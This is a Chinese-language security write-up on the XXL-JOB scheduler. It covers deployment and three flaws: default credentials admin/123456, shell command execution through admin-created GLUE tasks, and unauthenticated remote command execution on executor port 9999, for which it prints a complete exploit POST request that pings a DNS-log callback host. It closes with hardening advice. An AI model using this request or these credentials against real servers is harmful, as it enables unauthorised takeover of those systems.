# XXL-JOB安全简析

![](../Images/7820d7697e512f56d1dbf570db296d08.png)XXL-JOB简介

  

XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。其项目代码已在GITEE和GITHUB开源，开箱即用。XXL-JOB基于JAVA语言开发，并使用MYSQL作为其后端数据库，目前在GITHUB上已有将近20K的Star，其官网地址为：https://www.xuxueli.com/xxl-job/。  

   

![](../Images/7820d7697e512f56d1dbf570db296d08.png)XXXL-JOB安装部署  

###   

### **1.本地部署**

  

首先安装一个MYSQL数据库，版本要在5.7以上，使用navicat等工具进行连接。  

  

![](../Images/eff3e285334d830b5a3c14452cf176ef.png)

  

  

下载XXL-JOB的源码包，下载地址为https://github.com/xuxueli/xxl-job/releases  

  

下载后，在目录xxl-job-2.3.0\\doc\\db下会有一个初始化SQL脚本，使用navicat将该脚本导入到MYSQL数据库中。  

  

![](../Images/48edc12c3c66b659997ee3c7c5d6eeb5.png)

  

![](../Images/6450de561bb0bd913e4c7d90913839c9.png)

  

  

  

使用IDEA打开源码包，修改\\xxl-job-2.3.0\\xxl-job-admin\\src\\main\\resources\\application.properties配置文件中的MYSQL数据库配置。  

  

![](../Images/033e564e48c00c930898f5dcde70a9e8.png)

  

运行\\xxl-job-2.3.0\\xxl-job-admin\\src\\main\\java\\com\\xxl\\job\\admin\\XxlJobAdminApplication.java  

  

![](../Images/2f39eb9eaeeae0d4f7eaca4de845093b.png)

  

访问http://localhost:8080/xxl-job-admin/toLogin

  

![](../Images/8ef9ce545541ddf1d0f243ee46acbae6.png)

###   

### **2.docker部署**

  

执行下列两条命令即可完成部署

docker pullxuxueli/xxl-job-admin

docker run -ePARAMS="--spring.datasource.url=jdbc:mysql://ip:3306/xxl\_job?useUnicode=true&characterEncoding=UTF-8&autoReconnect=true&serverTimezone=Asia/Shanghai--spring.datasource.username=username--spring.datasource.password=password" -p 8080:8080 -v /tmp:/data/applogs--name xxl-job-admin -d xuxueli/xxl-job-admin:2.3.0

   

![](../Images/7820d7697e512f56d1dbf570db296d08.png)XXL-JOB漏洞合集

  

### **1.XXL-JOB后台默认弱口令漏洞**

  

影响版本：全版本

XXL-JOB安装后，存在默认口令，且该口令为弱口令，为admin/123456  

  

![](../Images/25b1b2d353fb822033ff3760727aba09.png)  
![](../Images/aa0595700191d26b6dc638231b740334.png)

### **2.XXL-JOB后台任意命令执行漏洞**

  

影响版本：全版本

登录进入XXL-JOB后台，点击任务管理，新增一个任务  

  

![](../Images/f79369daa6f49c5cb9cee9409fbf7377.png)

  

运行模式选择GLUE(Shell)，调度类型选择CRON，Cron表示计划任务的运行时间频率。  

  

![](../Images/d9063d0696c9fd3fdf5061c8be6c41ed.png)

  

点击保存后进入GLUE IDE  

  

![](../Images/20be745a1ff75b1140e835d48f78f959.png)

  

输入反弹shell命令，VPS开启监听  

  

![](../Images/0587e24f2cb02f697d7e51af2f87aaa6.png)

  

![](../Images/37ef23bff071cd724d69bd381a679151.png)

  

保存后关闭，点击执行一次操作。  

  

![](../Images/6753c2b729fb4b8ddc21b3a3af1f4267.png)

### **3.XXL-JOB未授权远程命令执行漏洞**

  

影响版本：XXL-JOB <= 2.2.0  

  

该漏洞的成因是XXL-JOB默认不开启API接口认证，攻击者可以通过调用未经授权的API接口，直接发送恶意请求，执行任意系统命令，达到控制服务器的效果。目前在最新的2.3.0版本中已默认开启API接口认证。  

  

XXL-JOB默认的执行器端口为9999  

  

![](../Images/e4b59039c9ba820eba1c0e42d48b3034.png)

  

在未登录的情况下构造如下POST请求包

POST /run HTTP/1.1

Host: ip:9999

User-Agent: Mozilla/5.0(Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0

Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8

Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip,deflate

Connection: close

Upgrade-Insecure-Requests:1

Content-Length: 307

 

{"jobId":1,"executorHandler":"demoJobHandler","executorParams":"demoJobHandler","executorBlockStrategy":"COVER\_EARLY","executorTimeout":0,"logId":1,"logDateTime":1586629003729,"glueType":"GLUE\_SHELL","glueSource":"pingw5wm8g.dnslog.cn","glueUpdatetime":1586699003758,"broadcastIndex":0,"broadcastTotal":0}  

  

![](../Images/8943e5d330507b64ad9492a4e87428b5.png)

  

成功在未授权条件下进行命令执行  

  

![](../Images/c6f56400bd97e2afa6f52bbd28d7b70e.png)  
  
![](../Images/7820d7697e512f56d1dbf570db296d08.png)XXL-JOB安全建议  

  

1.安装部署XXL-JOB后及时修改默认口令为强口令，密码至少为8位以上的大小写字母与数字组合；  

  

2.将XXL-JOB部署在内网，禁止开放在公网；如必须部署在公网，则修改后台默认端口，同时屏蔽执行器端口或者设置ip白名单；  

  

3.由于XXL-JOB为开源下面，在条件允许的情况下可以自行二次开发加入登录防爆破功能。
